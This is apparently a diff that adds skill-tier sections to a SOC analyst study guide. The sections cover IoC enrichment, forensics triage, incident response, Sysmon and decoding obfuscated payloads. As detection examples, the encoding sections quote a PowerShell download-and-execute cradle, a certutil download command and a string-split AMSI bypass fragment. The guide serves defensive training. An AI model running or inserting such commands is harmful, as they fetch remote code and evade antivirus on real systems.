+  <summary>🟢 Beginner — IoC Types by OSI Layer</summary>
+  <div class="tier-body">
+    <h4>Categorize Every IoC by Layer</h4>
+    <ul>
+      <li><strong>L3 IoC</strong>: IP addresses (192.168.56.10) — block at firewall</li>
+      <li><strong>L4 IoC</strong>: malicious ports (4444 = Meterpreter) — block in firewall rules</li>
+      <li><strong>L7 IoC</strong>: domains, URLs, file hashes — block at proxy/AV/DNS sinkhole</li>
+      <li>Free enrichment: VirusTotal (hashes/domains), AbuseIPDB (L3 IPs), URLScan (L7 URLs)</li>
+    </ul>
+    <pre><code><span class="cm"># IoC enrichment by OSI layer</span>
+SHA256 hash    → VirusTotal → L7 malware family
+Domain/URL     → URLScan.io → L7 page + L3 hosting
+IP address     → AbuseIPDB  → L3 reputation + ASN</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — MITRE ATT&amp;CK × OSI Mapping</summary>
+  <div class="tier-body">
+    <h4>Map Every TTP to an OSI Layer</h4>
+    <ul>
+      <li>Phishing (T1566): L7 delivery via email/document</li>
+      <li>PowerShell (T1059.001): L7 execution on endpoint</li>
+      <li>C2 Web Protocols (T1071.001): L7 HTTP/HTTPS over L3/L4 to attacker infrastructure</li>
+      <li>DNS Tunneling (T1048.003): L7 DNS query abuse over L4 UDP:53</li>
+    </ul>
+    <pre><code><span class="cm"># Correlate alert IoC → ATT&CK → detection layer</span>
+Brute force src_ip (L3) → T1110 Brute Force
+Port 4444 beacon (L4)   → T1571 Non-Standard Port
+HTTP User-Agent (L7)    → T1071.001 Web Protocols</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Diamond Model &amp; JA3 Attribution</summary>
+  <div class="tier-body">
+    <h4>Cross-Layer Threat Actor Pivoting</h4>
+    <ul>
+      <li>Pivot: L3 IP → registrar → ASN → other campaigns using same hosting</li>
+      <li>JA3 = MD5 of TLS ClientHello parameters (L7) — same C2 tool → same fingerprint even on new L3 IPs</li>
+      <li>Link L3/L4/L7 IoCs in MISP to reconstruct full threat actor infrastructure</li>
+    </ul>
+    <pre><code><span class="cm"># JA3 TLS fingerprint hunting in Zeek ssl.log (L7)</span>
+<span class="cm"># Cobalt Strike: ja3=51c64c77e60f3980eea90869b68c58a8</span>
+cat /nsm/zeek/logs/current/ssl.log | zeek-cut ja3 id.orig_h | grep "51c64c"
+<span class="cm"># Pivot: find all src IPs with this L7 fingerprint</span></code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-10-digital-forensics">
 <article class="topic">
 <h1>10 · Digital Forensics</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Digital forensics primarily examines L7 artifacts (files, registry, browser history, logs). Disk images may also contain L3 network evidence: cached DNS, ARP tables, and network connection records from the compromised system.</span>
+</div>
 <hr class="divider">
 <h2>Order of Volatility — Collect Most Volatile First</h2>
 <div class="callout warn"><strong>Rule:</strong> Always collect from most volatile to least. Rebooting destroys RAM!</div>
@@ -705,12 +1271,72 @@ journalctl -b</code></pre>
     <tr><td>/etc/crontab</td><td>Persistence via scheduled jobs</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Order of Volatility &amp; Triage</summary>
+  <div class="tier-body">
+    <h4>Collect Most Volatile First — Always</h4>
+    <ul>
+      <li><strong>RAM</strong>: most volatile — contains running processes, encryption keys, network connections (L3/L4/L7)</li>
+      <li><strong>Network state</strong>: live L3 routing table and L4 open connections — lost on reboot</li>
+      <li><strong>Disk artifacts</strong>: L7 files, logs, registry — persistent but attacker may modify</li>
+      <li>Windows forensics: event logs (L7), $MFT (L7 filesystem), prefetch (L7 execution evidence)</li>
+    </ul>
+    <pre><code><span class="cm"># Live Windows triage (collect before rebooting)</span>
+ipconfig /all                 <span class="cm"># L3 network config</span>
+netstat -ano                  <span class="cm"># L3/L4 active connections + PIDs</span>
+tasklist /v                   <span class="cm"># L7 running processes</span>
+wevtutil qe Security /c:100   <span class="cm"># L7 last 100 security events</span></code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Windows + Linux Evidence Locations</summary>
+  <div class="tier-body">
+    <h4>Where to Look on Each Platform</h4>
+    <ul>
+      <li>Windows: Event Log (4624/4625 = auth), Sysmon (process/network), Prefetch (execution)</li>
+      <li>Linux: /var/log/auth.log (SSH), /var/log/apache2/ (web), ~/.bash_history (commands)</li>
+      <li>All are L7 application-layer artifacts — but auth logs contain L3 source IPs</li>
+    </ul>
+    <pre><code><span class="cm"># Linux: who connected and from which L3 IP?</span>
+grep "Accepted\|Failed" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq -c
+<span class="cm"># Linux: unusual processes (could be L7 malware)</span>
+ps auxf | grep -v "\[" | awk '{print $1, $11}' | sort -u
+<span class="cm"># Linux: unusual L3/L4 network connections</span>
+ss -tulnp | grep -v "127.0.0.1"</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Memory Forensics &amp; Timeline</summary>
+  <div class="tier-body">
+    <h4>Advanced Artifact Analysis</h4>
+    <ul>
+      <li>Volatility: dump L7 process memory, extract L3 network connections from RAM, find injected code</li>
+      <li>Plaso/log2timeline: build a super-timeline correlating L7 events across all log sources</li>
+      <li>Key: match L3 IP from auth log to L7 process that spawned the connection (netstat + Sysmon)</li>
+    </ul>
+    <pre><code><span class="cm"># Volatility memory forensics (L7 process artifacts)</span>
+vol -f memory.raw windows.pslist          <span class="cm"># L7 process list</span>
+vol -f memory.raw windows.netscan         <span class="cm"># L3/L4 connections in RAM</span>
+vol -f memory.raw windows.cmdline         <span class="cm"># L7 command line args</span>
+vol -f memory.raw windows.malfind         <span class="cm"># L7 injected code detection</span></code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-11-incident-response">
 <article class="topic">
 <h1>11 · Incident Response (IR)</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Incident Response spans the full OSI stack — containment isolates L3 networks and blocks L4 ports, eradication removes L7 malware, and the IR report documents the full L3-to-L7 attack path.</span>
+</div>
 <hr class="divider">
 <h2>IR Phases — PICERL</h2>
 <div class="table-wrap"><table>
@@ -746,12 +1372,79 @@ journalctl -b</code></pre>
   <li><strong>Recommendations</strong> — how to prevent recurrence</li>
 </ol>
 <div class="callout"><strong>Exam Tip:</strong> The 24-hour PSAA exam requires a written report — use these sections.</div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — PICERL &amp; Containment Basics</summary>
+  <div class="tier-body">
+    <h4>The 6 IR Phases (PICERL)</h4>
+    <ul>
+      <li><strong>Preparation</strong>: playbooks, contact lists, tool deployment before incidents</li>
+      <li><strong>Identification</strong>: alert triage — is this a real incident? What layer is affected?</li>
+      <li><strong>Containment</strong>: isolate at L3 (network block) or L7 (endpoint isolate) to stop spread</li>
+      <li><strong>Eradication</strong>: remove malware (L7), patch vulnerability (L4/L7), reset credentials (L7)</li>
+    </ul>
+    <pre><code><span class="cm"># IR quick triage: what layer is compromised?</span>
+L3 network:    unusual traffic, outbound to bad IP, DDoS
+L4 transport:  port scan, unusual listening ports, exfil over odd port
+L7 application: malware, phishing, web shell, unauthorized access</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Evidence Collection &amp; Containment</summary>
+  <div class="tier-body">
+    <h4>Contain First, Then Investigate</h4>
+    <ul>
+      <li>Short-term containment: isolate host at L3 (remove from network VLAN) while preserving evidence</li>
+      <li>Long-term containment: firewall rule blocking L3 C2 IP/CIDR, DNS sinkhole (L7 domain), disable compromised account (L7)</li>
+      <li>Eradication: re-image (don't just delete malware — attacker may have multiple L7 persistence mechanisms)</li>
+    </ul>
+    <pre><code><span class="cm"># Containment — block at multiple OSI layers</span>
+L3: firewall block src/dst IP 185.220.101.x/24
+L4: block outbound TCP 4444, 1337, unusual high ports
+L7: disable compromised user accounts, revoke tokens
+DNS: sinkhole C2 domain → 127.0.0.1 (blocks L7 resolution)</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — IR Report Writing for PSAA</summary>
+  <div class="tier-body">
+    <h4>Structure Your 24-Hour Exam Report</h4>
+    <ul>
+      <li>Executive Summary: business impact, what data/systems affected — one paragraph, no jargon</li>
+      <li>Timeline: chronological sequence mapping each event to an OSI layer and Kill Chain phase</li>
+      <li>Technical Details: all IoCs organized by layer (L3 IPs, L4 ports, L7 hashes/domains)</li>
+      <li>Root Cause: which L7 vulnerability or user action enabled initial access</li>
+    </ul>
+    <pre><code><span class="cm"># IR report IoC section template</span>
+=== L3 Network IoCs ===
+Attacker IP:  192.168.56.10 (internal attacker VM)
+C2 IP:        185.220.101.x (Tor exit node)
+
+=== L4 Transport IoCs ===
+Reverse shell port: TCP 4444
+Exfil channel: UDP 53 (DNS tunnel)
+
+=== L7 Application IoCs ===
+Malware hash: [SHA256]
+C2 domain:    evil.c2domain.com
+Backdoor user: "backdoor" account created at 14:32 UTC</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-12-windows">
 <article class="topic">
 <h1>12 · Windows Investigation — Sysmon &amp; PowerShell</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Windows investigation combines L7 process/registry events (Sysmon) with L3/L4 network connection data. Sysmon EventID 3 logs L3 dest IP and L4 dest port for each process network connection.</span>
+</div>
 <hr class="divider">
 <div class="callout lab"><strong>From your own notes on the Windows compromise lab!</strong></div>
 <h2>Sysmon Event IDs — Know These</h2>
@@ -810,12 +1503,75 @@ netstat -anob</code></pre>
     <tr><td>shell</td><td>Drop into Windows shell from Meterpreter</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Key Sysmon Event IDs</summary>
+  <div class="tier-body">
+    <h4>Sysmon Logs by OSI Layer</h4>
+    <ul>
+      <li><strong>EventID 1</strong> (Process Create): L7 — captures process name, parent, full command line</li>
+      <li><strong>EventID 3</strong> (Network Connection): L3/L4 — dest IP + dest port per process = critical for C2 detection</li>
+      <li><strong>EventID 11</strong> (File Created): L7 — malware dropping files to disk</li>
+      <li><strong>Windows EventID 4625</strong>: L3 src IP + L7 username of failed logon</li>
+    </ul>
+    <pre><code><span class="cm"># Sysmon: find processes making outbound connections (L3/L4 + L7)</span>
+EventID=3: Image=C:\Windows\System32\powershell.exe
+           DestinationIp=185.220.101.x     → L3 C2 IP
+           DestinationPort=4444            → L4 reverse shell port
+<span class="cm"># EventID 1: suspicious child process</span>
+ParentImage=C:\...\WINWORD.EXE
+Image=C:\Windows\System32\cmd.exe          → macro dropper (L7)</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — PowerShell Forensics</summary>
+  <div class="tier-body">
+    <h4>Decode Malicious PowerShell (L7)</h4>
+    <ul>
+      <li>PowerShell EventID 4103/4104: logs script block content — catches obfuscated L7 payloads</li>
+      <li><code>-enc</code> / <code>-EncodedCommand</code>: base64-encoded L7 command — always decode and inspect</li>
+      <li>Common LOLBin → network: <code>certutil -urlcache -f http://[L3 IP]/file</code> — L7 download over L3/L4</li>
+    </ul>
+    <pre><code><span class="cm"># Decode PowerShell encoded command (L7 obfuscation)</span>
+[System.Text.Encoding]::Unicode.GetString(
+  [System.Convert]::FromBase64String("encoded_payload_here")
+)
+<span class="cm"># Sysmon EventID 3: powershell.exe connecting out</span>
+<span class="cm"># DestinationPort:4444 → reverse Meterpreter shell (L4→L7)</span></code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Full Windows Attack Chain Reconstruction</summary>
+  <div class="tier-body">
+    <h4>Correlate Sysmon + Windows Events + Network</h4>
+    <ul>
+      <li>Chain: EventID 4624 (L7 logon) → EventID 1 (L7 cmd.exe) → EventID 3 (L3/L4 C2 connection) → EventID 4720 (L7 account created)</li>
+      <li>Sysmon EventID 8 (CreateRemoteThread): process injection — attacker code running inside legitimate L7 process</li>
+      <li>EventID 4698 (Scheduled Task): L7 persistence — attacker installing recurring execution</li>
+    </ul>
+    <pre><code><span class="cm"># Full attack chain in Kibana/Splunk (L7 event IDs)</span>
+4625 × 50 from same L3 IP   → brute force
+4624 LogonType=10           → RDP success (L4 port 3389)
+Sysmon 1: cmd.exe           → initial access (L7)
+Sysmon 3: L3/L4 beacon out  → C2 established
+4720: user "backdoor"       → persistence (L7)
+4698: scheduled task        → persistence (L7)
+1102: Security log cleared  → cover tracks (L7)</code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-13-encoding">
 <article class="topic">
 <h1>13 · Encoding Recognition &amp; CyberChef</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">Encoding and obfuscation are L7 Application-layer techniques — attackers encode commands/payloads to evade L7 content inspection. CyberChef decodes these L7 artifacts to reveal the underlying command or malicious URL.</span>
+</div>
 <hr class="divider">
 <p>The goal: look at unknown text and instantly recognize <strong>WHAT it is</strong> before you try to decode it.</p>
 <div class="callout"><strong>CyberChef</strong> — bookmark: <code>gchq.github.io/CyberChef</code> · Use <strong>Magic</strong> recipe when unsure!</div>
@@ -895,12 +1651,79 @@ echo 'ROT13STRING' | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></pre>
   <li><strong>From Charcode</strong> — use for ASCII decimal (set delimiter to Space)</li>
   <li><strong>Save recipes</strong> — build your own reusable decode chain</li>
 </ul>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Recognize Encoding on Sight</summary>
+  <div class="tier-body">
+    <h4>Visual Encoding Identification (all L7)</h4>
+    <ul>
+      <li><strong>Base64</strong>: letters + numbers + <code>+/=</code> padding, length divisible by 4</li>
+      <li><strong>Hex</strong>: only 0-9 and a-f characters, often pairs: <code>48 65 6c 6c 6f</code></li>
+      <li><strong>URL encoding</strong>: <code>%XX</code> percent-encoded characters, common in web attacks (L7 HTTP)</li>
+      <li><strong>ROT13</strong>: letters only, looks like English but shifted — if you can almost-read it, try ROT13</li>
+    </ul>
+    <pre><code><span class="cm"># Quick Base64 decode in terminal (L7 encoded payload)</span>
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+<span class="cm"># Quick hex decode</span>
+echo "48656c6c6f" | xxd -r -p
+<span class="cm"># URL decode with python (L7 encoded URL)</span>
+python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — CyberChef Workflow</summary>
+  <div class="tier-body">
+    <h4>Decode Chained L7 Obfuscation</h4>
+    <ul>
+      <li>Attackers chain encodings: URL encode a Base64 string, or double-Base64 encode a PowerShell command</li>
+      <li>CyberChef "Magic" recipe auto-detects the encoding type — use when unsure</li>
+      <li>Common SOC scenario: Base64 PowerShell → decode → XOR decryption → shellcode → analyze</li>
+    </ul>
+    <pre><code><span class="cm"># Common chained obfuscation patterns (L7 defense evasion)</span>
+Double Base64: Base64(Base64(payload))  → CyberChef: 2× From Base64
+URL + Base64:  URL_encode(Base64(cmd))  → CyberChef: URL Decode → From Base64
+Hex + XOR:     Hex(XOR(payload, key))   → CyberChef: From Hex → XOR
+
+<span class="cm"># PowerShell download cradle (common in phishing payloads)</span>
+powershell -enc [BASE64_BLOB]
+<span class="cm"># After decoding: IEX (New-Object Net.WebClient).DownloadString('http://[L3 IP]/payload')</span></code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Obfuscated PowerShell &amp; Shellcode</summary>
+  <div class="tier-body">
+    <h4>Multi-Layer L7 Payload Analysis</h4>
+    <ul>
+      <li>PowerShell AMSI bypass attempts: look for string splitting, char-code reassembly, reflection</li>
+      <li>Shellcode delivered as Base64/XOR → decoded in memory → never touches disk (fileless)</li>
+      <li>Use CyberChef "Disassemble x86" on decoded shellcode to read L7 instructions</li>
+    </ul>
+    <pre><code><span class="cm"># AMSI bypass detection pattern (L7 obfuscation)</span>
+<span class="cm"># Attacker splits string to avoid signature: "Amsi"+"Utils" → "AmsiUtils"</span>
+$a = 'Amsi'; $b = 'Utils'; [Ref].Assembly.GetType("System.Management.Automation.${a}${b}")
+
+<span class="cm"># Decode multi-layer: Base64 → XOR → shellcode</span>
+<span class="cm"># CyberChef recipe chain:</span>
+<span class="cm"># 1. From Base64</span>
+<span class="cm"># 2. XOR (key = known from sample analysis)</span>
+<span class="cm"># 3. Disassemble x86 (64-bit)</span></code></pre>
+  </div>
+</details>
 </article>
 </template>
 
 <template id="tpl-ref-tools">
 <article class="topic">
 <h1>REF · Additional Tools &amp; Resources</h1>
+<div class="osi-bar">
+  <span class="osi-label">OSI Layers</span>
+  <span class="osi-chip l3">L3 Network</span>
+  <span class="osi-chip l4">L4 Transport</span>
+  <span class="osi-chip l7">L7 Application</span>
+  <span class="osi-note">SOC tools span all layers: network scanners (L3/L4), SIEM and log platforms (L7), sandbox analysis tools (L3/L4/L7), and threat intel enrichment (L3 IPs, L7 domains/hashes).</span>
+</div>
 <hr class="divider">
 <p><em>Tools widely used in industry that may not be covered in the course.</em></p>
 <h2>Network Analysis</h2>
@@ -972,6 +1795,66 @@ ps auxf</code></pre>
     <tr><td>crontab.guru</td><td>crontab.guru</td><td>Cron schedule strings</td></tr>
   </tbody>
 </table></div>
+
+<hr class="tier-divider">
+<div class="tier-heading">Skill Tiers</div>
+<details class="tier beginner" open>
+  <summary>🟢 Beginner — Essential SOC Tool Stack</summary>
+  <div class="tier-body">
+    <h4>One Tool Per OSI Layer</h4>
+    <ul>
+      <li><strong>L2/L3/L4</strong> — Wireshark: raw packet capture and protocol decode across all layers</li>
+      <li><strong>L3/L4</strong> — Nmap: discover L3 hosts and enumerate L4 open ports/services</li>
+      <li><strong>L7</strong> — VirusTotal / AbuseIPDB: enrich L7 hashes/domains and L3 IPs</li>
+      <li><strong>L7</strong> — CyberChef: decode any L7 obfuscation scheme (Base64, hex, URL, XOR)</li>
+    </ul>
+    <pre><code><span class="cm"># Triage tool cheat sheet</span>
+Suspicious IP?   → AbuseIPDB (L3 reputation)
+Malware file?    → VirusTotal (L7 hash + strings)
+Unknown string?  → CyberChef Magic (L7 decode)
+Suspicious URL?  → URLScan.io (L7 page analysis)
+Network traffic? → Wireshark (L2-L7 decode)</code></pre>
+  </div>
+</details>
+<details class="tier intermediate">
+  <summary>🟡 Intermediate — Workflow Integration</summary>
+  <div class="tier-body">
+    <h4>Link Tools Across OSI Layers</h4>
+    <ul>
+      <li>Threat intel workflow: alert L3 IP → AbuseIPDB → MISP → VirusTotal for correlated L7 samples</li>
+      <li>Network + endpoint correlation: Zeek L3/L4 conn.log → Sysmon L7 process matching same timestamp</li>
+      <li>Sandbox workflow: ANY.RUN submission → extract L3/L4 C2 IPs and L7 domains → feed into SIEM rules</li>
+    </ul>
+    <pre><code><span class="cm"># Integrated SOC triage flow</span>
+1. Alert: SIEM rule fires (L3 src IP + L7 event type)
+2. Enrich: AbuseIPDB (L3) + VirusTotal (L7 if hash available)
+3. Pivot: Zeek conn.log → find all connections from that L3 IP
+4. Correlate: Sysmon EventID 3 → which L7 process made the connection?
+5. Sandbox: submit file to ANY.RUN → map L3/L4/L7 C2 indicators
+6. Block: firewall rule (L3 IP), DNS sinkhole (L7 domain), AV signature (L7 hash)</code></pre>
+  </div>
+</details>
+<details class="tier advanced">
+  <summary>🔴 Advanced — Build Your SOC Toolkit</summary>
+  <div class="tier-body">
+    <h4>Automate Enrichment Across All Layers</h4>
+    <ul>
+      <li>VirusTotal API: automate L7 hash/domain/URL lookups from SIEM alerts</li>
+      <li>MISP feeds: auto-import threat intel into SIEM — block L3 IPs and L7 domains automatically</li>
+      <li>TheHive + Cortex: automated enrichment (L3 IP → GeoIP, L7 domain → DNS/WHOIS)</li>
+    </ul>
+    <pre><code><span class="cm"># VirusTotal API: automate L7 hash lookup</span>
+curl -X GET "https://www.virustotal.com/api/v3/files/[SHA256]" \
+  -H "x-apikey: [YOUR_API_KEY]"
+
+<span class="cm"># MISP: query for L3 IP IoC via API</span>
+curl -H "Authorization: [API_KEY]" \
+  "https://misp.local/attributes/restSearch/value:192.168.56.10"
+
+<span class="cm"># Automated alert enrichment pipeline</span>
+<span class="cm"># SIEM alert → Python script → VT + AbuseIPDB API → enrich case in TheHive</span></code></pre>
+  </div>
+</details>
 </article>
 </template>
 
